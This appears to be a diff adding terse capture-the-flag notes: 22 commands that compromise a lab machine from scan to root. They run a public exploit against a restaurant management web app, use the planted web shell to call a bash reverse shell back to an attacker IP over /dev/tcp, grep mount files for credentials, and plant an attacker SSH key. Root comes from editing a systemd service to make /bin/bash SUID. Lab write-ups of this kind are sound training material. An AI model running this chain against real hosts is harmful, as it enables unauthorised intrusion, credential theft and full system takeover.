@@ -1,0 +1,22 @@
+1 - nmap -A -p- 10.10.162.227
+2 - http://10.10.162.227:12340/
+3 - gobuster dir -u http://10.10.162.227:12340/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - http://10.10.162.227:12340/rms/
+5 - searchsploit -m 47520
+6 - python3 47520.py http://10.10.162.227:12340/rms/
+7 - http://10.10.162.227:12340/rms/images/reverse-shell.php?cmd=id
+8 - view-source:http://10.10.162.227:12340/rms/images/reverse-shell.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.8.94.51%2F4444%200%3E%261
+9 - systemctl list-unit-files --type=service
+10 - cat /etc/systemd/system/zeno-monitoring.service
+11 - grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
+12 - su edward
+13 - cat /home/edward/user.txt
+14 - cat ~/.ssh/id_rsa.pub (attacker)
+15 - echo "PUB FILE" >> authorized_keys
+16 - ssh edward@10.10.162.227
+17 - vi /etc/systemd/system/zeno-monitoring.service
+18 - ExecStart=/usr/bin/chmod +s /bin/bash
+19 - sudo /usr/sbin/reboot
+20 - ssh edward@10.10.162.227
+21 - /bin/bash -p
+22 - cat /root/root.txt
